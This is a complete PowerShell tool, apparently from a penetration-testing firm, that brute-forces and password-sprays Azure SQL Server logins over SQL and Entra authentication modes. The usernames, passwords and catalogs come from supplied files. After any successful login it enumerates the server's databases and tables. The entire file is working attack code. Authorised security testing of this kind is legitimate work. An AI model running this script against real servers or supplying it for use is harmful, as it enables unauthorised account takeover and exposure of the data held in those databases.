<#
.SYNOPSIS
    Conduct a brute force attack on an Azure SQL Server using specified parameters and modes.

.DESCRIPTION
    This script attempts to connect to an Azure SQL Server using a combination of usernames and passwords from provided files.
    It supports different attack modes and connection methods.

.PARAMETER Server
    The name or IP address of the Azure SQL Database server against which the attack is executed. This should primarily be an Azure SQL Database server.

.PARAMETER Port
    The port number to connect to on the Azure SQL Server.

.PARAMETER InitialCatalogueFile
    The file containing a list of initial catalogs to connect to, with each value on a new line.

.PARAMETER UsernamesFile
    The file containing a list of usernames without headers, with each username on a new line.

.PARAMETER PasswordsFile
    The file containing a list of passwords without headers, with each password on a new line.

.PARAMETER AttackMode
    The mode of the attack. "Pitchfork" is a classic brute force where each username is matched with the password on the same line. "ClusterBomb" combines every username with every password, sending many passwords for one account before moving to the next account. "PasswordSpray" tries one password for all users before moving to the next password.

.PARAMETER ConnectionMode
    The type of connection string used depending on the allowed authentication method for the SQL database. The options are "EntraPasswordless", "SQL", "EntraPassword", or "EntraIntegrated".

.EXAMPLE
    .\Access-AzureSQLDatabase.ps1 -Server "sqlserver.database.windows.net" -Port 1433 -InitialCatalogueFile "initialCatalogue.txt" -UsernamesFile "usernames.txt" -PasswordsFile "passwords.txt" -AttackMode "Pitchfork" -ConnectionMode "SQL"
    This command will attempt to connect to the specified SQL Server using the usernames and passwords from the provided files in Pitchfork mode with SQL authentication.

.NOTES
    Author: Daniel Hejda
    Company: Cyber Rangers s.r.o. 
    Date Created: 2024-07-11
    Change Log:
        2024-07-11 - Script created.
#>

param (
    [parameter(Mandatory)][string]$Server,
    [int]$Port=1433,
    [parameter(Mandatory)][string]$InitialCatalogueFile,
    [parameter(Mandatory)][string]$UsernamesFile,
    [parameter(Mandatory)][string]$PasswordsFile,
    [parameter(Mandatory)]
    [ValidateSet("Pitchfork", "ClusterBomb", "PasswordSpray")]
    [string]$AttackMode,
    [parameter(Mandatory)]
    [ValidateSet("EntraPasswordless", "SQL", "EntraPassword", "EntraIntegrated")]
    [string]$ConnectionMode
)

# Načtení InitialCatalogue z textového souboru
$initialCatalogues = @(Get-Content -Path $InitialCatalogueFile)

# Hlavicka
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host ""
Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkYellow
Write-Host "Attack to Azure SQL Server" -ForegroundColor Cyan
Write-Host "--> Server Name: $($Server)" -ForegroundColor Blue
Write-Host "--> Server Port: $($Port)" -ForegroundColor Blue
Write-Host "--> Attack Mode: $($AttackMode)" -ForegroundColor Blue
Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkYellow

# Funkce pro kontrolu dostupnosti portu
function Test-Port {
    param (
        [string]$Server,
        [int]$Port
    )
    try {
        $tcpConnection = Test-NetConnection -ComputerName $Server -Port $Port
        return $tcpConnection.TcpTestSucceeded
    }
    catch {
        return $false
    }
}

# Kontrola dostupnosti portu
if (-not (Test-Port -Server $Server -Port $Port)) {
    Write-Host "The port $($Port) on server $($Server) is not accessible." -ForegroundColor Red
    exit
}

# Funkce pro pokus o připojení k databázi
function Attempt-Connection {
    param (
        [string]$Server,
        [int]$Port,
        [string]$InitialCatalogue,
        [string]$Username,
        [string]$Password,
        [int]$CurrentTest,
        [int]$TotalTests
    )

    # Volba connection stringu na základě režimu připojení
    switch ($ConnectionMode) {
        "EntraPasswordless" {
            $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;Authentication='Active Directory Default';"
        }
        "SQL" {
            $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Persist Security Info=False;User ID=$($Username);Password=$($Password);MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"
        }
        "EntraPassword" {
            $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Persist Security Info=False;User ID=$($Username);Password=$($Password);MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Authentication='Active Directory Password';"
        }
        "EntraIntegrated" {
            $connectionString = "Server=tcp:$($Server),$($Port);Initial Catalog=$($InitialCatalogue);Persist Security Info=False;User ID=$($Username);MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Authentication='Active Directory Integrated';"
        }
    }

    try {
        $connection = New-Object System.Data.SqlClient.SqlConnection
        $connection.ConnectionString = $connectionString
        $connection.Open()

        Write-Host "[$CurrentTest/$TotalTests] Success login with username: $($Username) and password: $($Password) on catalogue: $($InitialCatalogue)" -ForegroundColor Green

        # Výpis databází a tabulek
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT name FROM sys.databases"
        $reader = $command.ExecuteReader()
        Write-Host "Databases:" -ForegroundColor Yellow
        while ($reader.Read()) {
            Write-Host " - $($reader["name"])" -ForegroundColor Yellow
        }
        $reader.Close()

        $command.CommandText = "SELECT table_catalog, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'"
        $reader = $command.ExecuteReader()
        Write-Host "Tables in database $($InitialCatalogue):" -ForegroundColor Yellow
        while ($reader.Read()) {
            Write-Host " - $($reader["table_catalog"]).$($reader["table_name"])" -ForegroundColor Yellow
        }
        $reader.Close()

        $connection.Close()
        return $true
    }
    catch {
        Write-Host "[$CurrentTest/$TotalTests] Failed login with username: $($Username) and password: $($Password) on catalogue: $($InitialCatalogue)" -ForegroundColor Red
        return $false
    }
}

# Načtení uživatelských jmen a hesel z TXT souborů
$usernames = @(Get-Content -Path $UsernamesFile)
$passwords = @(Get-Content -Path $PasswordsFile)

# Výpočet celkového počtu testů
$totalTests = switch ($AttackMode) {
    "Pitchfork" { [math]::Min($usernames.Count, $passwords.Count) * $initialCatalogues.Count }
    "ClusterBomb" { $usernames.Count * $passwords.Count * $initialCatalogues.Count }
    "PasswordSpray" { $usernames.Count * $passwords.Count * $initialCatalogues.Count }
}
$currentTest = 0

# Provádění útoku podle zvoleného režimu
switch ($AttackMode) {
    "Pitchfork" {
        foreach ($InitialCatalogue in $initialCatalogues) {
            Write-Host "Initial Catalogue: $($InitialCatalogue)" -ForegroundColor Yellow
            for ($i = 0; $i -lt $usernames.Count -and $i -lt $passwords.Count; $i++) {
                $currentTest++
                $username = $usernames[$i]
                $password = $passwords[$i]
                if (Attempt-Connection -Server $Server -Port $Port -InitialCatalogue $InitialCatalogue -Username $username -Password $password -CurrentTest $currentTest -TotalTests $totalTests) {
                    break
                }
            }
        }
    }
    "ClusterBomb" {
        foreach ($InitialCatalogue in $initialCatalogues) {
            Write-Host "Initial Catalogue: $($InitialCatalogue)" -ForegroundColor Yellow
            foreach ($username in $usernames) {
                foreach ($password in $passwords) {
                    $currentTest++
                    if (Attempt-Connection -Server $Server -Port $Port -InitialCatalogue $InitialCatalogue -Username $username -Password $password -CurrentTest $currentTest -TotalTests $totalTests) {
                        break
                    }
                }
            }
        }
    }
    "PasswordSpray" {
        foreach ($InitialCatalogue in $initialCatalogues) {
            Write-Host "Initial Catalogue: $($InitialCatalogue)" -ForegroundColor Yellow
            foreach ($password in $passwords) {
                foreach ($username in $usernames) {
                    $currentTest++
                    if (Attempt-Connection -Server $Server -Port $Port -InitialCatalogue $InitialCatalogue -Username $username -Password $password -CurrentTest $currentTest -TotalTests $totalTests) {
                        break
                    }
                }
            }
        }
    }
}
